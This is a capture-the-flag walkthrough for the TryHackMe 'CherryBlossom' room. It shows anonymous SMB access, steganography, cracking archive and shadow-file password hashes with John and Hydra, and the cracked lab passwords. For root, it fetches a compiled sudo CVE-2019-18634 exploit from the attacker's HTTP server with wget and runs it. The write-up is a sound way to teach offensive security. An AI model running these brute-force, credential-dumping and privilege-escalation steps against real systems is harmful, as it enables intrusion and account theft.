# [CherryBlossom](https://tryhackme.com/room/cherryblossom)

## Boot-to-root with emphasis on crypto and password cracking.

# Flags

## Hack the machine and get the flags!

### Journal Flag

_https://github.com/DominicBreuker/stego-toolkit_

1. Port scan with nmap to identify available services

```bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/c322b55a-e855-428c-9d12-3663e541b038)

2. The scan reveals an SMB service is running. Examine and access it

```bash
# List available SMB shares without providing credentials
smbclient -L //IP -N

# Connect to the Anonymous share without credentials
smbclient //IP/Anonymous -N

# List contents of the share
ls

# Download the journal.txt file for analysis
get journal.txt
```

![SCREEN02](https://github.com/user-attachments/assets/6d414add-e57b-4c57-ae60-fb1d8deae3c9)

3. The `journal.txt` file is base64 encoded. Decode it to reveal its true content

```bash
cat journal.txt | base64 -d > journal
```

4. Using steganography extract the hidden data from PNG image

```bash
pip3 install stegpy
stegpy journal
```

5. Fix the magic numbers to match `.zip` file
   - Replace the first characters with `50 4B 03 04`

```bash
hexedit _journal.zip
```

![SCREEN03](https://github.com/user-attachments/assets/10eae49e-1ed6-4e8c-952a-99477edd76c1)

6. The `.zip` file is password protected. Use John the Ripper to crack it
   - The password is **september**

```bash
zip2john _journal.zip > hash.txt
john hash.txt
unzip _journal.zip
```

![SCREEN04](https://github.com/user-attachments/assets/bb14c848-8e5d-4809-bfde-6074d107fc75)

7. Inside the ZIP is a file named `Journal.ctz` which is a 7z archive, also password protected
   - The password is **tigerlily**

```bash
# Download the 7z2john script if not available
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/7z2john.pl -O 7z2john
chmod +x 7z2john

# Create a hash from the 7z file
./7z2john Journal.ctz > hash.txt

# Crack the hash using rockyou.txt
john --wordlist=/root/Tools/wordlist/rockyou.txt hash.txt

# If you encounter errors, you may need to install dependencies:
apt-get install liblzma-dev
cpan install Compress::Raw::Lzma
```

![SCREEN05](https://github.com/user-attachments/assets/7106f491-f4b0-4b42-b375-706365c31d4d)

8. The extracted contents include a diary with the first flag and important information
   - Usernames: **Anitta**, **Lily**, **Harry**
   - A file containing encoded passwords named: **cherry-blossom**

![SCREEN06](https://github.com/user-attachments/assets/80235b71-ca58-45e1-9c82-216aff0972e2)

---

### User Flag

1. From the `Journal.ctz` archive, extract the encoded password list
   - Copy the hash from line 55, decode it, and extract to a list

```bash
cat encoded | base64 -d > cherry-blossom.list
```

![SCREEN07](https://github.com/user-attachments/assets/07e20b29-71da-4334-99d2-eead7d5752e5)

2. Brute force SSH login using the discovered usernames and password list
   - The credentials are `lily:Mr.$un$hin3`

```bash
# Create a file with potential usernames
echo -e "lily\nanitta\nharry" > users.txt

# Use Hydra to brute force SSH
hydra -L users.txt -P cherry-blossom.list ssh://IP
```

![SCREEN08](https://github.com/user-attachments/assets/468dd843-e7d5-4a59-bfc6-a56acbb8dba8)

3. After gaining access as lily, find a backup of the shadow file with password hashes
   - Copy johan's password hash from the backup

```bash
cat /var/backups/shadow.bak
```

![SCREEN09](https://github.com/user-attachments/assets/5dce60c0-8581-4526-bfef-66a24c055b07)

4. Crack johan's password hash using our custom wordlist
   - The password is **##scuffleboo##**

```bash
# Save johan's hash to a file on your attacking machine
echo '$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0' > hash.txt

# Use John the Ripper with the SHA-512 format
john --format=sha512crypt --wordlist=cherry-blossom.list.txt hash.txt
```

![SCREEN10](https://github.com/user-attachments/assets/c1243026-e70a-4689-91ac-d85f3256b813)

5. Switch to johan's account and retrieve the user flag

```bash
# Switch user to johan
su johan

# Enter password: ##scuffleboo##

# Rread the user flag
cat /home/johan/user.txt
```

![SCREEN11](https://github.com/user-attachments/assets/07b11070-0301-4d76-8ce9-ba35713d6f9c)

---

### Root Flag

1. To escalate to root, exploit the sudo vulnerability CVE-2019-18634 (buffer overflow in pwfeedback)

```bash
# On the attacking machine, clone the exploit repository
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
cd sudo-cve-2019-18634/

# Compile the exploit
gcc exploit.c -o exploit

# Start a simple HTTP server to transfer the exploit
python -m SimpleHTTPServer
```

![SCREEN12](https://github.com/user-attachments/assets/63189781-3c94-44c2-8944-bb53721027c9)

```bash
cd /tmp

# Download the compiled exploit
wget http://IP:8000/exploit

# Make it executable
chmod +x exploit

# Execute the exploit
./exploit

# Verify we have root access
whoami

# Retrieve the root flag
cat /root/root.txt
```

![SCREEN13](https://github.com/user-attachments/assets/d4c6a7bc-3be2-4e92-9d53-5361ef611299)
